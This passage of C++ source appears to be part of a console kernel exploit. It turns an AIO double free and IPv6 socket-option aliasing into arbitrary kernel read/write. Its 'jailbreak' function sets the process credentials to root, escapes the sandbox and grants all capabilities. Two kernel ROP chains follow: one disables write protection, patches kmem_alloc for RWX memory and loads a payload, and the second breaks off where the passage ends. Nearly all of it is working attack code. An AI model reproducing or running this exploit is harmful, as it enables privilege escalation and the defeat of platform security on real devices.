            sds[tclass] = create_ipv6udp();
            sds[i] = create_ipv6udp();
            // We need to give pktopts to the new sockets now to prevent unnecessary
            // allocations that might interfere with our attempt to confuse pktopts with rthdrs
            // later, since calling set_rthdr() will make a pktopts if a socket doesn't have it
            PS::setsockopt(sds[tclass], IPPROTO_IPV6, IPV6_TCLASS, &tclass, sizeof(tclass));
            PS::setsockopt(sds[i], IPPROTO_IPV6, IPV6_TCLASS, &tclass, sizeof(tclass));
            return 0;
        }

        // Free pktopts objects
        for (uint32_t i = 0; i < NUM_SDS; i++)
        {
            if (sds[i] < 0) continue; // Skip invalid sockets
            PS::setsockopt(sds[i], IPPROTO_IPV6, IPV6_2292PKTOPTIONS, 0, 0);
        }
    }
    printf_debug("Failed to make aliased pktopts!\n");
    return -1;
}

/*
SceKernelEventFlag aliased_evfs[2] = {0, 0};

// returns 0 on success, -1 on failure
int32_t make_aliased_evfs()
{
    for (uint32_t loop = 0; loop < NUM_ALIAS; loop++)
    {
        SceKernelEventFlag evfs[NUM_HANDLES] = {0};

        for (uint32_t i = 0; i < NUM_HANDLES; i++)
            new_evf(&evfs[i], i);

        for (uint32_t i = 0; i < NUM_HANDLES; i++)
        {
            int64_t flag = -1;
            poll_evf(evfs[i], flag, (uint64_t*)&flag);
            if (flag < 0) continue; // Poll failed
            if (flag == i) continue; // Not aliased
            printf_debug("Aliased evfs %d & %d found at attempt: %d\n",
                i, flag, loop);
            aliased_evfs[0] = evfs[i]; evfs[i] = 0;
            aliased_evfs[1] = evfs[flag]; evfs[flag] = 0;
            printf_debug("Aliased evfs: %p %p\n",
                aliased_evfs[0], aliased_evfs[1]);
            return 0;
        }

        for (uint32_t i = 0; i < NUM_HANDLES; i++)
            free_evf(evfs[i]);
    }
    printf_debug("Failed to make aliased evfs!\n");
    return -1;
}
*/

#define MAX_LEAK_LEN 0x800
#define NUM_BATCHES 2
#define NUM_CLOBBERS 8

int32_t dirty_sd = -1;

// Sets err, returns err
int32_t double_free_reqs1()
{
    printf_debug("STAGE 3: Double free SceKernelAioRWRequest\n");

    uint8_t buf[0x80 * NUM_LEAKED_BLOCKS] = {0};

    SceKernelAioRWRequest reqs[MAX_REQS] = {0};
    SceKernelAioSubmitId ids[MAX_REQS * NUM_BATCHES] = {0};
    SceKernelAioError states[MAX_REQS] = {0};

    for (uint32_t i = 0; i < MAX_REQS; i++)
        reqs[i].fd = -1;

    printf_debug("* Start overwrite rthdr with AIO queue entry loop\n");

    free_evf(s2.evf);
    bool aio_not_found = true;
    for (uint32_t i = 0; i < NUM_CLOBBERS; i++)
    {
        spray_aio(ids, NUM_BATCHES, reqs, MAX_REQS);
        socklen_t len = MAX_LEAK_LEN;
        get_rthdr(rthdr_sds[0], buf, &len);
        if (len == 8 && buf[0] == SCE_KERNEL_AIO_CMD_READ)
        {
            printf_debug("Aliased at attempt: %d\n", i);
            hexdump(buf, 0x80);
            aio_not_found = false;
            cancel_aios(ids, MAX_REQS * NUM_BATCHES);
            break;
        }
        free_aios(ids, MAX_REQS * NUM_BATCHES);
    }
    if (aio_not_found) {
        printf_debug("Failed to overwrite rthdr\n");
        return (err = -1);
    }

    ip6_rthdr<0x80> rthdr = {0};
    aio_entry *reqs2 = (aio_entry *)&rthdr;

    reqs2->ar2_ticket = 5; // ip6r_segleft = 5
    reqs2->ar2_info = s2.reqs1; // the 0x100 block to double free

    // Craft a aio_batch using the end portion of the buffer
    reqs2->ar2_batch = s2.evf_p + 0x28;
    aio_batch *fake_batch = (aio_batch *)((uint8_t*)&rthdr + 0x28);

    fake_batch->ar3_num_reqs = 1;
    fake_batch->ar3_reqs_left = 0;
    fake_batch->ar3_state = SCE_KERNEL_AIO_STATE_COMPLETED;
    fake_batch->ar3_done = 0;
    // .ar3_lock.lock_object.lo_flags = (
    //     LO_SLEEPABLE | LO_UPGRADABLE
    //     | LO_RECURSABLE | LO_DUPOK | LO_WITNESS
    //     | 6 << LO_CLASSSHIFT
    //     | LO_INITIALIZED
    // )
    fake_batch->lock_object_flags = 0x67b0000;
    // .ar3_lock.lk_lock = LK_UNLOCKED
    fake_batch->lock_object_lock = 1;

    hexdump((uint8_t *)reqs2, 0x80);

    printf_debug("* Start overwrite AIO queue entry with rthdr loop\n");

    PS::close(rthdr_sds[0]);
    rthdr_sds[0] = -1;

    SceKernelAioSubmitId req_id = 0;
    for (uint32_t i = 0; i < NUM_ALIAS; i++)
    {
        for (uint32_t j = 0; j < NUM_SDS; j++)
        {
            if (s0.sds[j] < 0) continue; // Skip invalid sockets
            set_rthdr(s0.sds[j], &rthdr, rthdr.used_size);
        }

        for (uint32_t j = 0; j < MAX_REQS * NUM_BATCHES; j += MAX_REQS)
        {
            aio_multi_cancel(&ids[j], MAX_REQS, states);

            int32_t req_idx = -1;
            for (int32_t k = 0; k < MAX_REQS; k++)
            {
                if (states[k] != SCE_KERNEL_AIO_STATE_COMPLETED) continue;
                req_idx = k;
                break;
            }
            if (req_idx < 0) continue;

            req_id = ids[j + req_idx];
            ids[j + req_idx] = 0;

            printf_debug("states[%d]: %08x, req_id: %p\n",
                req_idx, states[req_idx], req_id);
            printf_debug("* Found req_id at batch: %d\n", j / MAX_REQS);

            // set .ar3_done to 1
            // also enable deletion of req_id
            aio_multi_poll(&req_id, 1, aio_errs);
            printf_debug("aio_multi_poll errs[0] %08x\n", aio_errs[0]);

            for (uint32_t k = 0; k < NUM_SDS; k++)
            {
                if (s0.sds[k] < 0) continue; // Skip invalid sockets
                socklen_t len = rthdr.used_size;
                get_rthdr(s0.sds[k], &rthdr, &len);
                if (fake_batch->ar3_done == 1)
                {
                    hexdump((uint8_t *)&rthdr, 0x80);
                    dirty_sd = s0.sds[k];
                    s0.sds[k] = -1;
                    free_rthdrs(s0.sds, NUM_SDS);
                    break;
                }
            }

            if (dirty_sd < 0)
            {
                printf_debug("Cannot find sd that overwrote AIO queue entry!\n");
                return -1;
            }
            printf_debug("dirty_sd: %d\n", dirty_sd);

            goto loop_break;
        }
    }
    loop_break:

    if (!req_id)
    {
        printf_debug("Failed to overwrite AIO queue entry!\n");
        return (err = -1);
    }

    free_aios2(ids, MAX_REQS * NUM_BATCHES);

    // Enable deletion of target_id
    aio_multi_poll(&s2.target_id, 1, aio_errs);
    printf_debug("target's state: %08x\n", aio_errs[0]);

    SceKernelAioError errs[2] = {-1, -1};
    SceKernelAioSubmitId target_ids[2] = {req_id, s2.target_id};
    
    // Free All aio requests that were used to spray the fake aio_batch
    // Safe since aio_batch remains intact by the time aio_multi_delete() is called
    // free_aios(s2.batch_ids, NUM_HANDLES);

    // Free all pktopts to reclaim the 0x100 block with pktopts
    // // Free all rthdrs to reclaim the 0x80 block with evfs
    for (uint32_t i = 0; i < NUM_SDS; i++)
    {
        if (s0.sds[i] < 0) continue; // Skip invalid sockets
        PS::setsockopt(s0.sds[i], IPPROTO_IPV6, IPV6_2292PKTOPTIONS, 0, 0);
    }

    // PANIC: double free on the 0x100 malloc zone. important kernel data may alias
    aio_multi_delete(target_ids, 2, errs);
    printf_debug("Delete errors: %08x, %08x\n", errs[0], errs[1]);

    // We reclaim first since the sanity checking here is longer which makes it
    // more likely that we have another process claim the memory

    // // RESTORE: double freed 0x80 block has been reclaimed with harmless data
    // // err = make_aliased_evfs();

    // RESTORE: double freed 0x100 block has been reclaimed with harmless data
    // PANIC: 0x100 malloc zone pointers aliased
    err = make_aliased_pktopts();

    aio_multi_poll(target_ids, 2, states);
    printf_debug("Target states: %08x, %08x\n", states[0], states[1]);

    bool success = true;
    if (states[0] != SCE_KERNEL_ERROR_ESRCH) {
        printf_debug("ERROR: bad delete of corrupt AIO request\n");
        success = false;
    }
    if (errs[0] != 0 || errs[0] != errs[1]) {
        printf_debug("ERROR: bad delete of ID pair\n");
        success = false;
    }
    if (!success)
    {
        printf_debug("ERROR: double free on a 0x100 malloc zone failed\n");
        return (err = -1);
    }

    return err;
}

uint64_t kread64(ptr64_t addr)
{
    ptr64_t pktinfo_p = s2.reqs1 + IPV6_PKTINFO_OFFSET;
    uint8_t pktinfo[0x14] = {0};
    // pktinfo.ip6po_pktinfo = &pktinfo.ip6po_pktinfo
    // This is needed again to prevent `setsockopt` from overwriting
    // the `pktinfo_p` pointer we set earlier.
    *(uint64_t*)pktinfo = pktinfo_p;

    uint32_t nhop = 0;
    uint8_t read_buf[8] = {0};
    uint32_t len = sizeof(read_buf), offset = 0;

    // While this seems dumb at first, getsockopt/IPV6_NEXTHOP
    // doesn't always respect the length we provide. This loop
    // guarentees that we read the full 8 bytes no matter what.
    while (offset < len)
    {
        // pktopts.ip6po_nhinfo = addr + offset
        *(uint64_t*)&pktinfo[0x8] = addr + offset;
        nhop = len - offset;

        PS::setsockopt(
            pktopts_sds[0], IPPROTO_IPV6, IPV6_PKTINFO, pktinfo, sizeof(pktinfo)
        );

        PS::getsockopt(
            pktopts_sds[0], IPPROTO_IPV6, IPV6_NEXTHOP, read_buf + offset, &nhop
        );

        if (nhop == 0) read_buf[offset++] = 0; // Fallbacks to 0
        else offset += nhop;
    }

    return *(uint64_t*)read_buf;
}

ptr64_t locate_pktopts(int32_t sd, ptr64_t ofiles)
{
    ptr64_t file = kread64(ofiles + (sd * SIZEOF_OFILES));
    ptr64_t sock = kread64(file + FILE_FDATA);
    ptr64_t pcb = kread64(sock + SOCK_PCB);
    ptr64_t pktopts = kread64(pcb + PCB_PKTINFO);
    return pktopts;
}

KernelMemoryArgs kmem_args = {0};

struct stage4_s
{
    int32_t reclaim_sd = -1;
    int32_t pipe_fds[2] = {-1, -1};
    ptr64_t pipe_p = 0;
    // pipe_buf.buffer backup for pipe restoration
    ptr64_t pipe_buffer = 0;
    // For pktinfo restoration and double free recovery
    ptr64_t pktopts_p = 0;
    ptr64_t r_pktopts_p = 0;
    // Current process object for kernel ROP
    ptr64_t proc = 0;
};
stage4_s s4;

// Sets err, returns err
int32_t make_kernel_arw()
{
    printf_debug("STAGE 4: Get arbitrary kernel read/write\n");

    ip6_rthdr<0x100> rthdr = {0};
    uint8_t *pktopts = (uint8_t*)&rthdr;

    uint64_t pktinfo_p = s2.reqs1 + IPV6_PKTINFO_OFFSET;
    printf_debug("pktinfo_p: 0x%08x%08x\n",
        (uint32_t)(pktinfo_p >> 32), (uint32_t)pktinfo_p);

    // pktopts.ip6po_pktinfo = &pktopts.ip6po_pktinfo
    // We do this to trick setsockopt/getsockopt into reading/writing
    // to the pktopts object itself instead of an external pktinfo
    *(uint64_t*)(&pktopts[IPV6_PKTINFO_OFFSET]) = pktinfo_p;

    printf_debug("* Overwrite main pktopts\n");
    s4.reclaim_sd = -1;
    PS::close(pktopts_sds[1]);
    pktopts_sds[1] = -1;

    uint32_t tclass = 0;

    for (uint32_t i = 0; i < NUM_ALIAS; i++)
    {
        for (uint32_t j = 0; j < NUM_SDS; j++)
        {
            if (s0.sds[j] < 0) continue; // Skip invalid sockets
            *(uint32_t*)&pktopts[TCLASS_OFFSET] = 0x4141 | i << 16;
            set_rthdr(s0.sds[j], &rthdr, rthdr.used_size);
        }

        socklen_t len = sizeof(tclass);
        PS::getsockopt(
            pktopts_sds[0], IPPROTO_IPV6, IPV6_TCLASS, &tclass, &len
        );

        if ((tclass & 0xffff) == 0x4141)
        {
            printf_debug("tclass: %08x\n", tclass);
            s4.reclaim_sd = s0.sds[tclass >> 16];
            s0.sds[tclass >> 16] = -1;
            printf_debug("Found reclaim_sd %d at attempt: %d\n",
                s4.reclaim_sd, i);
            break;
        }
    }

    if (s4.reclaim_sd < 0) {
        printf_debug("Failed to overwrite main pktopts\n");
        return (err = -1);
    }

    // Test read
    {
    uint64_t value = kread64(s2.evf_cv_str_p);
    uint8_t *str = (uint8_t*)&value;

    printf_debug("Test read `evf_cv_str_p`: %c%c%c%c%c%c%c%c",
        str[0], str[1], str[2], str[3], str[4], str[5], str[6], str[7]);
    printf_debug("\n");

    value = kread64(pktinfo_p);

    printf_debug("Test read `pktinfo_p`: 0x%08x%08x\n",
        (uint32_t)(value >> 32), (uint32_t)value);

    if (value != pktinfo_p)
    {
        printf_debug("Test read failed!\n");
        return (err = -1);
    }
    }

    printf_debug("* Achieved restricted read!\n");

    // // Attempting to reclaim the double freed 0x80 block with rthdrs
    // free_evf(aliased_evfs[0]);
    // free_evf(aliased_evfs[1]);
    // err = make_aliased_rthdrs();
    // if (err < 0) printf_debug("Failed to reclaim double freed 0x80 block!\n");
    // else printf_debug("* Reclaimed double freed 0x80 block!\n");

    // Finding the current process object
    // `ar2_info` object should have a pointer to curproc at offset 8,
    // assuming that it hasn't been overwritten after being freed.
    s4.proc = kread64(s2.req2->ar2_info + 8);
    // Check if we got a valid proc address
    if (s4.proc >> 8*6 != 0xffff
        || (uint32_t)kread64(s4.proc + PROC_PID) != PS::getpid())
    {
        printf_debug("Invalid proc address!\n");
        return (err = -1);
    }
    printf_debug("proc: 0x%08x%08x\n",
        (uint32_t)(s4.proc >> 32), (uint32_t)s4.proc);

    // Locating file descriptors
    ptr64_t proc_fd = kread64(s4.proc + PROC_FD);
    printf_debug("proc_fd: 0x%08x%08x\n",
        (uint32_t)(proc_fd >> 32), (uint32_t)proc_fd);
    ptr64_t proc_ofiles = kread64(proc_fd + FILEDESC_OFILES);
    printf_debug("proc_ofiles: 0x%08x%08x\n",
        (uint32_t)(proc_ofiles >> 32), (uint32_t)proc_ofiles);

    // Creating a pipe as a primitive for arbitrary read/write
    create_pipe(s4.pipe_fds);

    // Locating the pipe file
    ptr64_t pipe_file = kread64(
        proc_ofiles + (s4.pipe_fds[0] * SIZEOF_OFILES)
    );
    printf_debug("pipe_file: 0x%08x%08x\n",
        (uint32_t)(pipe_file >> 32), (uint32_t)pipe_file);
    s4.pipe_p = kread64(pipe_file + FILE_FDATA);
    printf_debug("pipe_p: 0x%08x%08x\n",
        (uint32_t)(s4.pipe_p >> 32), (uint32_t)s4.pipe_p);

    // Backing up pipe_buf.buffer
    s4.pipe_buffer = kread64(s4.pipe_p + 0x10);
    printf_debug("pipe_buf.buffer: 0x%08x%08x\n",
        (uint32_t)(s4.pipe_buffer >> 32), (uint32_t)s4.pipe_buffer);

    // Obtaining pktopts addresses
    s4.pktopts_p = locate_pktopts(pktopts_sds[0], proc_ofiles);
    printf_debug("pktopts_p: 0x%08x%08x\n",
        (uint32_t)(s4.pktopts_p >> 32), (uint32_t)s4.pktopts_p);
    if (s4.pktopts_p != s2.reqs1)
    {
        printf_debug("pktopts_p doesn't match reqs1!\n");
        return (err = -1);
    }

    s4.r_pktopts_p = locate_pktopts(s4.reclaim_sd, proc_ofiles);
    printf_debug("r_pktopts_p: 0x%08x%08x\n",
        (uint32_t)(s4.r_pktopts_p >> 32), (uint32_t)s4.r_pktopts_p);

    ptr64_t d_pktopts_p = locate_pktopts(dirty_sd, proc_ofiles);
    printf_debug("d_pktopts_p: 0x%08x%08x\n",
        (uint32_t)(d_pktopts_p >> 32), (uint32_t)d_pktopts_p);

    // Getting restricted read/write with pktopts pair
    uint8_t pktinfo[0x14] = {0};
    // pktopts_p.ip6po_pktinfo = &r_pktopts_p.ip6po_pktinfo
    *(uint64_t*)pktinfo = s4.r_pktopts_p + IPV6_PKTINFO_OFFSET;
    
    // After this, calling setsockopt/IPV6_PKTINFO for pktopts_p would set
    // the pointer of r_pktopts_p's pktopts object to any address we want,
    // making it acting as a reading/writing head.
    // Calling getsockopts/IPV6_PKTINFO or setsockopt/IPV6_PKTINFO for
    // r_pktopts_p would read from or write to the address we set.
    PS::setsockopt(
        pktopts_sds[0], IPPROTO_IPV6, IPV6_PKTINFO, pktinfo, sizeof(pktinfo)
    );

    // Test write
    {
    uint8_t write_buf[0x14] = {0};

    *(uint64_t*)pktinfo = PVAR_TO_NATIVE(write_buf);
    PS::setsockopt(
        pktopts_sds[0], IPPROTO_IPV6, IPV6_PKTINFO, pktinfo, sizeof(pktinfo)
    );

    *(uint64_t*)pktinfo = 0x4242424213371337;
    PS::setsockopt(
        s4.reclaim_sd, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo, sizeof(pktinfo)
    );

    printf_debug("Test write: 0x%08x%08x\n",
        *(uint32_t*)(write_buf + 4), *(uint32_t*)(write_buf)
    );

    if (*(uint64_t*)(write_buf) != *(uint64_t*)(pktinfo))
    {
        printf_debug("Test write failed!\n");
        return (err = -1);
    }
    }

    printf_debug("* Achieved restricted write!\n");

    kmem_args.head_sd = pktopts_sds[0];
    kmem_args.rw_sd = s4.reclaim_sd;
    kmem_args.pipes = s4.pipe_fds;
    kmem_args.pipe_p = s4.pipe_p;
    kmem_args.pipe_buffer = s4.pipe_buffer;
    Kernel_Memory kmemory = Kernel_Memory(&kmem_args);
    printf_debug("* Kernel_Memory initialized!\n");
    
    // Test read with Kernel_Memory
    {
    uint8_t buf[16] = {0};

    kmemory.copyout(s2.kernel_base, buf, sizeof(buf));
    printf_debug("Test read from kernel base:\n");
    hexdump(buf, sizeof(buf));

    kmemory.copyout(s2.evf_cv_str_p, buf, sizeof(buf));
    printf_debug("Test read evf string:\n");
    hexdump(buf, sizeof(buf));

    if (!buf_match(buf, (uint8_t*)"evf cv", 6))
    {
        printf_debug("Test read failed!\n");
        return (err = -1);
    }
    }

    printf_debug("* Achieved arbitrary kernel read/write!\n");

    // RESTORE: clean corrupt pointers
    // pktopts.ip6po_rthdr = NULL
    ptr64_t r_rthdr_p = s4.r_pktopts_p + IP6PO_RTHDR_OFFSET;
    printf_debug("r_rthdr_p: 0x%08x%08x\n",
        (uint32_t)(r_rthdr_p >> 32), (uint32_t)r_rthdr_p);
    kmemory.write64(r_rthdr_p, 0);

    ptr64_t d_rthdr_p = d_pktopts_p + IP6PO_RTHDR_OFFSET;
    printf_debug("d_rthdr_p: 0x%08x%08x\n",
        (uint32_t)(d_rthdr_p >> 32), (uint32_t)d_rthdr_p);
    kmemory.write64(d_rthdr_p, 0);

    printf_debug("* Corrupt pointers cleaned!\n");

    return err;
}

ptr64_t find_thread_by_id(uint32_t thread_id)
{
    Kernel_Memory kmemory = Kernel_Memory(&kmem_args);
    // Locate the thread object
    // proc.p_threads.tqh_first
    ptr64_t thread = kmemory.read64(s4.proc + 0x10);
    while (thread != 0) {
        uint32_t tid = kmemory.read32(thread + 0x88);

        if (tid != thread_id) {
            // Advance to the next thread in the list
            // thread.td_plist.tqe_next
            thread = kmemory.read64(thread + 0x10);
            continue;
        };
        printf_debug("Found thread %d at address 0x%08x%08x\n",
            tid, (uint32_t)(thread >> 32), (uint32_t)thread);
        break;
    }
    return thread;
}

ptr64_t locate_read_ret(ptr64_t kstack, ptr64_t read_ret)
{
    Kernel_Memory kmemory = Kernel_Memory(&kmem_args);

    // We will discard trapframe that lives at the end
    #define SCAN_END (kstack + KSTACK_FRAME_OFFSET)
    // The address should be within this range
    #define SCAN_SIZE 0x200
    #define SCAN_START (SCAN_END - SCAN_SIZE)

    uint8_t buf[SCAN_SIZE] = {0};
    kmemory.copyout(SCAN_START, buf, sizeof(buf));

    ptr64_t ret_p = 0;
    // Scanning for read_ret
    for (uint32_t i = 0; i < SCAN_SIZE; i += 8)
    {
        if (*(uint64_t*)&buf[i] != read_ret) continue;
        ret_p = SCAN_START + i;
        break;
    }

    if (!ret_p) {
        printf_debug("Failed to locate sys_read() return address!\n");
        return ret_p;
    }

    printf_debug("Found sys_read() return address (0x%08x%08x) at 0x%08x%08x\n",
        (uint32_t)(read_ret >> 32), (uint32_t)read_ret,
        (uint32_t)(ret_p >> 32), (uint32_t)ret_p);

    return ret_p;
}

// Credit: https://github.com/shahrilnet/remote_lua_loader/blob/main/payloads/lapse.lua#L1677-L1706
void jailbreak()
{
    Kernel_Memory kmemory = Kernel_Memory(&kmem_args);

    ptr64_t ucred_p = kmemory.read64(s4.proc + PROC_UCRED);
    ptr64_t fd_p = kmemory.read64(s4.proc + PROC_FD);
    ptr64_t prison0 = kmemory.read64(s2.kernel_base + K_PRISON0);
    ptr64_t rootvnode = kmemory.read64(s2.kernel_base + K_ROOTVNODE);

    // Set ucred to root
    kmemory.write32(ucred_p + 0x04, 0); // cr_uid
    kmemory.write32(ucred_p + 0x08, 0); // cr_ruid
    kmemory.write32(ucred_p + 0x0C, 0); // cr_svuid
    kmemory.write32(ucred_p + 0x10, 1); // cr_ngroups
    kmemory.write32(ucred_p + 0x14, 0); // cr_rgid

    // Escape prison
    kmemory.write64(ucred_p + 0x30, prison0); // pr_prison

    // Get all capabilities
    kmemory.write64(ucred_p + 0x60, -1); // cr_sceCaps[0]
    kmemory.write64(ucred_p + 0x68, -1); // cr_sceCaps[1]

    // Get root file system access
    kmemory.write64(fd_p + FILEDESC_RDIR, rootvnode); // fd_rdir
    kmemory.write64(fd_p + FILEDESC_JDIR, rootvnode); // fd_jdir

    printf_debug("Jailbreak done!\n");
}

// Credit: https://github.com/TheOfficialFloW/PPPwn/blob/master/pppwn.py#L522-L611
int32_t run_payload()
{
    Kernel_Memory kmemory = Kernel_Memory(&kmem_args);

    ROP_Chain thr_chain = ROP_Chain((uint64_t*)thr_chain_buf, 0x4000);
    if (!thr_chain.is_initialized())
    {
        printf_debug("Failed to initialize ROP chain!\n");
        return (err = -1);
    }

    unixpair_s fds = {-1, -1};
    create_unixpair(&fds);
    uint64_t fake_buf = 0;
    int64_t ret = -1;
    {
    thr_chain.push_call(
        LIBKERNEL(LIB_KERNEL__READ),
        fds.block_fd, // This will suspend the thread
        PVAR_TO_NATIVE(&fake_buf),
        sizeof(fake_buf)
    );
    thr_chain.get_result(&ret);
    }

    ScePthread pthread = 0;
    err = thr_chain.execute(&pthread);
    if (err) printf_debug("Failed to execute ROP chain!\n");
    if (err) return err;

    uint32_t thread_id = (uint32_t)DEREF(pthread);
    printf_debug("Thread spawned! ID: %ld\n", thread_id);
    ptr64_t thread = find_thread_by_id(thread_id);

    // Allow thread to run
    sleep_ms(500);
    
    // Locating thread's kernel stack
    ptr64_t kstack = kmemory.read64(thread + TD_KSTACK);
    printf_debug("Thread's kernel stack: 0x%08x%08x\n",
        (uint32_t)(kstack >> 32), (uint32_t)kstack);

    // Locating sys_read() return address on stack to hijack
    ptr64_t read_ret = s2.kernel_base + K_SYS_READ_RET;
    ptr64_t read_ret_skip_check = s2.kernel_base + K_SYS_READ_RET_SKIP_CHECK;
    ptr64_t ret_p = locate_read_ret(kstack, read_ret);
    if (!ret_p) return (err = -1);

    ptr64_t chain_p = kstack + 0x3000; // We will write our ROP chain here

    // Writing stack pivot gadgets
    kmemory.write64(ret_p, s2.kernel_base + G_POP_RSP_RET);
    kmemory.write64(ret_p + 8, chain_p);

    // Writing our ROP chain
    uint64_t *kchain_buf = (uint64_t*)chain_buf;
    uint32_t index = 0;

    {
    // Preparing sys_write() arguments
    char message[] = "\n!!! HELLO FROM KERNEL !!!\n\n";
    struct write_args_s { int32_t fd; ptr64_t buf; size_t nbyte; }
    write_args = { debug_sock, PVAR_TO_NATIVE(message), sizeof(message) };
    // Copying write_args to kernel memory
    kmemory.copyin(&write_args, kstack + 0x100, sizeof(write_args));

    // setidt(IDT_UD, handler, SDT_SYSIGT, SEL_KPL, 0) to recover from UD2
    kchain_buf[index++] = s2.kernel_base + G_POP_RDI_RET;
    kchain_buf[index++] = 6; // IDT_UD
    kchain_buf[index++] = s2.kernel_base + G_POP_RSI_RET;
    // Skipping UD2 trap frame and returning to the next gadget
    kchain_buf[index++] = s2.kernel_base + G_ADD_RSP_28_POP_RBP_RET; // handler
    kchain_buf[index++] = s2.kernel_base + G_POP_RDX_RET;
    kchain_buf[index++] = 14; // SDT_SYSIGT
    kchain_buf[index++] = s2.kernel_base + G_POP_RCX_RET;
    kchain_buf[index++] = 0; // SEL_KPL
    kchain_buf[index++] = s2.kernel_base + G_POP_R8_POP_RBP_RET;
    kchain_buf[index++] = s2.kernel_base + 0; // DPL
    kchain_buf[index++] = 0x13371337; // Stack alignment (for POP RBP)
    kchain_buf[index++] = s2.kernel_base + K_SETIDT;

    // Disabling write protection
    kchain_buf[index++] = s2.kernel_base + G_POP_RSI_RET;
    kchain_buf[index++] = CR0_ORI & ~CR0_WP;
    kchain_buf[index++] = s2.kernel_base + G_MOV_CR0_RSI_UD2_MOV_EAX_1_RET;

    // Patching kmem_alloc for RWX
    kchain_buf[index++] = s2.kernel_base + G_POP_RAX_RET;
    kchain_buf[index++] = VM_PROT_ALL;
    kchain_buf[index++] = s2.kernel_base + G_POP_RCX_RET;
    kchain_buf[index++] = s2.kernel_base + K_KMEM_ALLOC_PATCH1;
    kchain_buf[index++] = s2.kernel_base + G_MOV_BYTE_PTR_RCX_AL_RET;
    kchain_buf[index++] = s2.kernel_base + G_POP_RCX_RET;
    kchain_buf[index++] = s2.kernel_base + K_KMEM_ALLOC_PATCH2;
    kchain_buf[index++] = s2.kernel_base + G_MOV_BYTE_PTR_RCX_AL_RET;

    // Restoring CR0
    kchain_buf[index++] = s2.kernel_base + G_POP_RSI_RET;
    kchain_buf[index++] = CR0_ORI;
    kchain_buf[index++] = s2.kernel_base + G_MOV_CR0_RSI_UD2_MOV_EAX_1_RET;

    // Restoring UD handler
    kchain_buf[index++] = s2.kernel_base + G_POP_RDI_RET;
    kchain_buf[index++] = 6; // IDT_UD
    kchain_buf[index++] = s2.kernel_base + G_POP_RSI_RET;
    kchain_buf[index++] = s2.kernel_base + K_XILL; // handler
    kchain_buf[index++] = s2.kernel_base + G_POP_RDX_RET;
    kchain_buf[index++] = 14; // SDT_SYSIGT
    kchain_buf[index++] = s2.kernel_base + G_POP_RCX_RET;
    kchain_buf[index++] = 0; // SEL_KPL
    kchain_buf[index++] = s2.kernel_base + G_POP_R8_POP_RBP_RET;
    kchain_buf[index++] = s2.kernel_base + 0; // DPL
    kchain_buf[index++] = 0x13371337; // Stack alignment (for POP RBP)
    kchain_buf[index++] = s2.kernel_base + K_SETIDT;

    // Calling sys_write()
    kchain_buf[index++] = s2.kernel_base + G_POP_RDI_RET;
    kchain_buf[index++] = thread;
    kchain_buf[index++] = s2.kernel_base + G_POP_RSI_RET;
    kchain_buf[index++] = kstack + 0x100;
    kchain_buf[index++] = s2.kernel_base + K_WRITE;

    // Allocating RWX memory
    // kmem_alloc(*kernel_map, PAGE_SIZE) to allocate RWX memory
    kchain_buf[index++] = s2.kernel_base + G_POP_RDI_RET;
    kchain_buf[index++] = kmemory.read64(s2.kernel_base + K_KERNEL_MAP);
    kchain_buf[index++] = s2.kernel_base + G_POP_RSI_RET;
    kchain_buf[index++] = ROUND_PG(payload_end - payload_start);
    kchain_buf[index++] = s2.kernel_base + K_KMEM_ALLOC;

    // Passing the allocated RWX memory address
    kchain_buf[index++] = s2.kernel_base + G_POP_RDX_RET;
    kchain_buf[index++] = kstack + 0x200; // RWX memory address
    kchain_buf[index++] = s2.kernel_base + G_MOV_QWORD_PTR_RDX_RAX_POP_RBP_RET;
    kchain_buf[index++] = 0x13371337; // Stack alignment (for POP RBP)

    // Restoring sys_read() return address
    kchain_buf[index++] = s2.kernel_base + G_POP_RDX_RET;
    kchain_buf[index++] = ret_p;
    kchain_buf[index++] = s2.kernel_base + G_POP_QWORD_PTR_RDX_RET;
    kchain_buf[index++] = read_ret_skip_check; // Skip stack overflow check

    // Returning back to the original stack
    kchain_buf[index++] = s2.kernel_base + G_POP_RSP_RET;
    kchain_buf[index++] = ret_p;
    }

    // Chain length limit is 66 gadgets (or even less?) for some reason ;(
    kmemory.copyin(kchain_buf, chain_p, index * 8);
    printf_debug("ROP chain written! Length: %d\n", index);

    // kmemory.copyout(kstack + DUMP_START, buf, sizeof(buf));
    // printf_debug("Thread's kernel stack dump:\n");
    // hexdump(buf, sizeof(buf));

    ptr64_t rwx_p = kmemory.read64(kstack + 0x200);

    // Resume thread
    PS::close(fds.unblock_fd);
    PS::close(fds.block_fd);

    // Obtaining RWX memory address
    ptr64_t tmp = 0;
    while ((tmp = kmemory.read64(kstack + 0x200)) == rwx_p)
        PS::Breakout::call(LIBKERNEL(LIB_KERNEL_SCHED_YIELD));
    rwx_p = tmp;
    printf_debug("RWX memory address: 0x%08x%08x\n",
        (uint32_t)(rwx_p >> 32), (uint32_t)rwx_p);

    scePthreadJoin(pthread, 0);
    printf_debug("Thread exited.\n");

    // Copying payload to RWX memory
    kmemory.copyin((void*)payload_start, rwx_p, payload_end - payload_start);

    // Restoring pktopts_p, r_pktopts_p, and launching payload
    fds = {-1, -1};
    create_unixpair(&fds);
    fake_buf = 0;
    ret = -1;
    {
    thr_chain.reset();
    thr_chain.push_call(
        LIBKERNEL(LIB_KERNEL__READ),
        fds.block_fd, // This will suspend the thread
        PVAR_TO_NATIVE(&fake_buf),
        sizeof(fake_buf)
    );
    thr_chain.get_result(&ret);
    }

    pthread = 0;
    err = thr_chain.execute(&pthread);
    if (err) printf_debug("Failed to execute second ROP chain!\n");
    if (err) return err;

    thread_id = (uint32_t)DEREF(pthread);
    printf_debug("Second thread spawned! ID: %ld\n", thread_id);
    thread = find_thread_by_id(thread_id);

    // Allow thread to run
    sleep_ms(500);
    
    // Locating thread's kernel stack
    kstack = kmemory.read64(thread + TD_KSTACK);
    printf_debug("Second thread's kernel stack: 0x%08x%08x\n",
        (uint32_t)(kstack >> 32), (uint32_t)kstack);

    // Locating sys_read() return address on stack to hijack
    ret_p = locate_read_ret(kstack, read_ret);
    if (!ret_p) return (err = -1);

    chain_p = kstack + 0x3000; // We will write our ROP chain here

    // Writing stack pivot gadgets
    kmemory.write64(ret_p, s2.kernel_base + G_POP_RSP_RET);
    kmemory.write64(ret_p + 8, chain_p);

    // Writing our ROP chain
    index = 0;

    {
    // Restoring pktopts_p
    kchain_buf[index++] = s2.kernel_base + G_POP_RDX_RET;
    kchain_buf[index++] = s4.pktopts_p + IPV6_PKTINFO_OFFSET;
